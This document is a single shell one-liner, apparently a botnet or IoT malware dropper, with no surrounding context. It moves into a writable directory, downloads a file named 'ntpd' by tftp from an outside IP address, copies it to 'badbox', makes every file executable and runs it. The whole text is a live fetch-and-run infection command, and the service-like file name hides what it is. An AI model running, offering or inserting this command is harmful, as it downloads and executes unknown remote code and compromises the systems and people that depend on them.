cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 198.167.136.126;cat ntpd >badbox;chmod +x *;./badbox
